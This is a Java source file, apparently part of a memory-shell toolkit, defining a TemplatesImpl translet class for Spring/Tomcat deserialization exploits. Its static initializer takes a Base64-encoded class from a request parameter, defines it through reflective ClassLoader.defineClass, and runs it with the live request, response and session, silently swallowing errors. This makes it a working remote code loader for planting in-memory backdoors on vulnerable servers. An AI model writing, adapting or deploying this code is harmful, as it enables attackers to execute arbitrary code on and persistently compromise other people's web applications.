package org.erosion2020.memshell.classloader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TemplatesImplSpring extends AbstractTranslet {
    public static String loader_pram;
    static{
        try{
            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
            java.lang.reflect.Field r=request.getClass().getDeclaredField("request");
            r.setAccessible(true);
            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();
            javax.servlet.http.HttpSession session = request.getSession();

            String body=request.getParameter(loader_pram);

            byte[] classBytes = java.util.Base64.getDecoder().decode(body);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(TemplatesImplSpring.class.getClassLoader(), classBytes, 0,classBytes.length);
            cc.newInstance().equals(new Object[]{request,response,session});
        }catch(Exception ignore){ }
    }
    @Override
    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
    }
    @Override
    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
    }
}
